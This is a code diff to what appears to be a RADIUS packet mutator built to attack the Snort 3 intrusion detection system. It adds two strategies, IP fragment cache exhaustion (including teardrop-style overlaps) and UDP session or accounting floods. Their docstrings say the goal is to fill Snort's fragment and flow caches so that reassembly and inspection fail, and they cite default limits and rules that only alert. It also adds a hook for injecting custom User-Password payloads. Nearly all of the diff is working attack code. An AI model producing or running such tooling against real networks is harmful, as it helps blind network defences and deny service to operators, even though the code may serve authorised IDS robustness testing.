@@ -51,9 +51,11 @@ RADIUS_STRATEGIES = [
     "coa_disconnect_abuse",
     "accounting_desync",
     "nas_filter_rule_crash",
+    "ip_frag_cache_exhaustion",
+    "udp_session_spray",
 ]
 
-RADIUS_WEIGHTS = [12, 10, 8, 8, 14, 8, 10, 6, 10, 5, 12, 6, 5, 8]
+RADIUS_WEIGHTS = [12, 10, 8, 8, 14, 8, 10, 6, 10, 5, 12, 6, 5, 8, 8, 6]
 
 RADIUS_STRATEGY_LABELS = {
     "authenticator_manipulation":       "Authenticator Manipulation (BlastRADIUS)",
@@ -70,6 +72,8 @@ RADIUS_STRATEGY_LABELS = {
     "coa_disconnect_abuse":             "CoA / Disconnect Abuse (RFC 5176)",
     "accounting_desync":                "Accounting Desync",
     "nas_filter_rule_crash":            "NAS-Filter-Rule Pre-Auth Crash",
+    "ip_frag_cache_exhaustion":        "IP Fragment Cache Exhaustion (stream_ip.max_frags)",
+    "udp_session_spray":               "UDP Session Spray (flow cache exhaustion)",
 }
 
 # Keep payloads inside a single UDP datagram.
@@ -338,7 +342,7 @@ def _build_attribute_tlv_overflow():
         return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
 
 
-def _build_user_password_encryption_abuse():
+def _build_user_password_encryption_abuse(payload_override=None):
     """Strategy 3: User-Password encryption chain abuse (RFC 2865 §5.2).
 
     Targets the MD5 XOR chain cipher. Variants:
@@ -349,6 +353,12 @@ def _build_user_password_encryption_abuse():
     - all_ff: password all 0xFF bytes
     - max_length_attr: exactly 130 bytes (2+128 max User-Password attr)
     """
+    if payload_override is not None:
+        ident = _rand_id()
+        auth = _rand_authenticator()
+        attrs = _base_access_request_attrs()
+        attrs.append(_tlv(_ATTR_USER_PASSWORD, payload_override))
+        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
     variant = random.choice([
         "oversized_password", "non_multiple_16", "empty_password",
         "all_zeros", "all_ff", "max_length_attr",
@@ -1011,6 +1021,173 @@ def _build_nas_filter_rule_crash():
     return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
 
 
+def _build_ip_frag_cache_exhaustion():
+    """Strategy 15: Exhaust Snort's IP fragment reassembly cache.
+
+    Generate RADIUS packets designed to be IP-fragmented, with structures
+    that produce many incomplete or overlapping fragment chains.  Snort's
+    stream_ip inspector holds fragments until timeout (60s default).
+    With max_frags=8192, filling the frag cache blocks reassembly for
+    ALL protocols.
+
+    Grounding:
+      - Snort 3 stream_ip.max_frags = 8,192 (default)
+      - Snort 3 stream_ip.max_overlaps = 0 (unlimited!)
+      - Snort 3 stream_ip.min_frag_length = 0 (no minimum check)
+      - Snort 3 stream_ip.session_timeout = 60s
+      - Rule 123:3 "short fragment DOS attempt" (alerts but doesn't prevent)
+      - Rule 123:8 "fragmentation overlap"
+      - Rule 123:12 "excessive fragment overlap"
+
+    Variants:
+    - incomplete_chains: first fragment only (no last frag → held 60s)
+    - overlapping_frags: overlapping fragment offsets (max_overlaps=0)
+    - tiny_fragments: 8-byte fragments (below typical MTU)
+    - teardrop_variant: overlapping fragments with negative effective offset
+    - mixed_ids: many different IP ID values, each incomplete
+    """
+    variant = random.choice([
+        "incomplete_chains", "overlapping_frags", "tiny_fragments",
+        "teardrop_variant", "mixed_ids",
+    ])
+    ident = _rand_id()
+    auth = _rand_authenticator()
+    attrs = _base_access_request_attrs()
+    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
+    base_pkt = _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs)
+
+    if variant == "incomplete_chains":
+        # Many first-fragments with different simulated IP IDs
+        # Each is a partial RADIUS packet (first 100 bytes) marked as "more frags"
+        # Snort holds each chain for session_timeout=60s
+        fragments = []
+        for i in range(200):
+            # Simulate a fragmented RADIUS payload by sending partial chunks
+            # with a unique per-fragment marker (simulates different IP IDs)
+            frag_id = struct.pack("!H", i & 0xFFFF)
+            chunk = frag_id + base_pkt[:random.randint(50, 100)]
+            fragments.append(chunk)
+        return b"".join(fragments)[:_MAX_UDP], 1812
+    elif variant == "overlapping_frags":
+        # Multiple copies of the same RADIUS data at overlapping "offsets"
+        # Simulates what stream_ip sees with overlapping IP fragments
+        copies = []
+        for offset in range(0, len(base_pkt), 8):
+            # Each "fragment" overlaps the previous by 4 bytes
+            start = max(0, offset - 4)
+            copies.append(base_pkt[start:offset + 16])
+        return b"".join(copies)[:_MAX_UDP], 1812
+    elif variant == "tiny_fragments":
+        # Break RADIUS packet into 8-byte "fragments" (minimum IP frag size)
+        frags = []
+        for i in range(0, len(base_pkt), 8):
+            frags.append(base_pkt[i:i + 8])
+        # Pad with additional tiny fragments to increase count
+        for _ in range(500):
+            frags.append(os.urandom(8))
+        return b"".join(frags)[:_MAX_UDP], 1812
+    elif variant == "teardrop_variant":
+        # Overlapping fragments where the second fragment's offset points
+        # before the end of the first — classic teardrop pattern
+        frag1 = base_pkt[:40]
+        # "Second fragment" starts at offset 20 (overlaps 20 bytes)
+        frag2 = base_pkt[20:80]
+        # Third fragment at offset 10 (overlaps everything)
+        frag3 = base_pkt[10:]
+        # Repeat to fill cache slots
+        result = bytearray()
+        for _ in range(100):
+            result.extend(frag1 + frag2 + frag3)
+        return bytes(result)[:_MAX_UDP], 1812
+    else:  # mixed_ids
+        # Many unique "flow" markers + partial data — each takes a cache slot
+        result = bytearray()
+        for i in range(500):
+            flow_marker = struct.pack("!I", random.randint(0, 0xFFFFFFFF))
+            partial = base_pkt[:random.randint(20, 60)]
+            result.extend(flow_marker + partial)
+        return bytes(result)[:_MAX_UDP], 1812
+
+
+def _build_udp_session_spray():
+    """Strategy 16: Exhaust Snort's flow cache via UDP session spray.
+
+    Each RADIUS packet from a unique source port creates a new UDP flow
+    in Snort's flow cache (keyed by 5-tuple).  By embedding per-packet
+    variation that simulates different source ports/IPs, we force Snort
+    to allocate many flow entries.  UDP flows timeout after 180s.
+
+    Grounding:
+      - Snort 3 stream.max_flows = 476,288
+      - Snort 3 stream.udp_cache.idle_timeout = 180s
+      - Snort 3 stream.prune_flows = 10 (slow eviction)
+      - Each unique 5-tuple = one flow entry
+      - RADIUS is UDP → no handshake overhead, cheap to spray
+
+    Variants:
+    - multi_port_spray: different RADIUS packets to ports 1812/1813/3799
+    - unique_id_spray: 500 packets with unique Identifier values
+    - max_attrs_spray: pad each packet with many attributes to increase cost
+    - accounting_spray: Accounting-Request flood (port 1813)
+    """
+    variant = random.choice([
+        "multi_port_spray", "unique_id_spray",
+        "max_attrs_spray", "accounting_spray",
+    ])
+
+    if variant == "multi_port_spray":
+        packets = []
+        ports = [1812, 1813, 3799]
+        for i in range(200):
+            ident = i & 0xFF
+            auth = _rand_authenticator()
+            attrs = _base_access_request_attrs()
+            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
+            # Alternate between RADIUS ports
+            code = [_CODE_ACCESS_REQUEST, _CODE_ACCOUNTING_REQUEST,
+                    _CODE_COA_REQUEST][i % 3]
+            port = ports[i % 3]
+            if code == _CODE_ACCOUNTING_REQUEST:
+                auth = _zero_authenticator()
+            packets.append(_radius_packet(code, ident, auth, attrs))
+        # Return concatenated — all go to port 1812 (transport handles routing)
+        return b"".join(packets)[:_MAX_UDP], 1812
+    elif variant == "unique_id_spray":
+        # 500 packets, each with a unique Identifier (0-255 cycling)
+        packets = []
+        for i in range(500):
+            auth = _rand_authenticator()
+            attrs = _base_access_request_attrs()
+            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
+            # Vary NAS-IP-Address to simulate different source IPs
+            attrs.append(_tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()))
+            packets.append(_radius_packet(_CODE_ACCESS_REQUEST, i & 0xFF, auth, attrs))
+        return b"".join(packets)[:_MAX_UDP], 1812
+    elif variant == "max_attrs_spray":
+        # Fewer packets but each is large — maximizes per-flow memory cost
+        packets = []
+        for i in range(50):
+            auth = _rand_authenticator()
+            attrs = _base_access_request_attrs()
+            # Fill packet with attributes to maximize memory allocation
+            while sum(len(a) for a in attrs) < 3500:
+                attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(200)))
+            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
+            packets.append(_radius_packet(_CODE_ACCESS_REQUEST, i & 0xFF, auth, attrs))
+        return b"".join(packets)[:_MAX_UDP], 1812
+    else:  # accounting_spray
+        # Accounting-Request flood — port 1813, zero authenticator
+        packets = []
+        for i in range(300):
+            auth = _zero_authenticator()
+            attrs = _base_accounting_attrs()
+            # Unique session ID per packet → unique flow
+            attrs.append(_tlv(_ATTR_ACCT_SESSION_ID,
+                              f"spray-{random.randint(0, 0xFFFFFFFF):08x}".encode()))
+            packets.append(_radius_packet(_CODE_ACCOUNTING_REQUEST, i & 0xFF, auth, attrs))
+        return b"".join(packets)[:_MAX_UDP], 1813
+
+
 # ── Dispatcher ──────────────────────────────────────────────────────────────
 _BUILDERS = {
     "authenticator_manipulation":     _build_authenticator_manipulation,
@@ -1027,15 +1204,22 @@ _BUILDERS = {
     "coa_disconnect_abuse":           _build_coa_disconnect_abuse,
     "accounting_desync":              _build_accounting_desync,
     "nas_filter_rule_crash":          _build_nas_filter_rule_crash,
+    "ip_frag_cache_exhaustion":       _build_ip_frag_cache_exhaustion,
+    "udp_session_spray":              _build_udp_session_spray,
 }
 
 
-def build_radius_payload(strategy: str):
+_RADIUS_OVERRIDE_CAPABLE = frozenset(["user_password_encryption_abuse"])
+
+def build_radius_payload(strategy: str, payload_override=None):
     """Return (payload_bytes, dst_port) for the given strategy."""
     builder = _BUILDERS.get(strategy)
     if builder is None:
         builder = _build_authenticator_manipulation
-    payload, dst_port = builder()
+    if payload_override is not None and strategy in _RADIUS_OVERRIDE_CAPABLE:
+        payload, dst_port = builder(payload_override=payload_override)
+    else:
+        payload, dst_port = builder()
     return _clamp(payload), dst_port
 
 
@@ -1053,11 +1237,11 @@ class RadiusMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return RADIUS_WEIGHTS
 
-    def mutate(self):
+    def mutate(self, payload_override=None):
         """Returns (payload_bytes, strategy_name, dst_port)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload, dst_port = build_radius_payload(strategy)
+        payload, dst_port = build_radius_payload(strategy, payload_override=payload_override)
         return payload, strategy, dst_port
